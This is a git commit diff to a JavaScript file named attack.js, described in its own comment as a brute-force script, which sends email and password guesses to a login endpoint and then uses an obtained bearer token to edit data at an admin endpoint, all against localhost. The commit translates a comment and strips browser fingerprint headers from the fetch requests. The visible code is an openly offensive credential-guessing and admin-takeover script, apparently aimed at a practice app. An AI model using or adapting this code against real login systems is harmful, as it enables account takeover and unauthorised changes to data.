ddcadd36b9b14e2ead0750dad1b80b84f66ae6d6
skulluglify <skulluglify@outlook.com>
2023-12-05 22:06:56 +0700

    furry

--- attack.js
+++ attack.js
@@ -1,6 +1,6 @@
 // step 1
 
-// script brute force pakai javascript!
+// script brute force using javascript!
 
 let tokenStealth;
 
@@ -15,19 +15,9 @@ const response = await fetch("http://localhost/login", {
     "accept": "*/*",
     "accept-language": "en-US,en;q=0.9,id;q=0.8",
     "content-type": "multipart/form-data; boundary=----WebKitFormBoundary0TwUMXk9SWzvvWwn",
-    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Windows\"",
-    "sec-fetch-dest": "empty",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-site": "same-origin"
   },
-  "referrer": "http://localhost/login.html",
-  "referrerPolicy": "strict-origin-when-cross-origin",
   "body": `------WebKitFormBoundary0TwUMXk9SWzvvWwn\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n${email}\r\n------WebKitFormBoundary0TwUMXk9SWzvvWwn\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n${pass}\r\n------WebKitFormBoundary0TwUMXk9SWzvvWwn--\r\n`,
   "method": "POST",
-  "mode": "cors",
-  "credentials": "omit"
 });
 
 return response.status == 200 ? await response.json() : null;
@@ -56,20 +46,10 @@ const response = await fetch("http://localhost/admin/todos/edit?id=1", {
     "accept": "*/*",
     "accept-language": "en-US,en;q=0.9,id;q=0.8",
     "content-type": "application/json",
-    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Windows\"",
-    "sec-fetch-dest": "empty",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-site": "same-origin",
     "authorization": "Bearer " + token
   },
-  "referrer": "http://localhost/login.html",
-  "referrerPolicy": "strict-origin-when-cross-origin",
   "body": JSON.stringify(data),
   "method": "PUT",
-  "mode": "cors",
-  "credentials": "omit"
 });
 
 return response.status == 200 ? await response.json() : null;
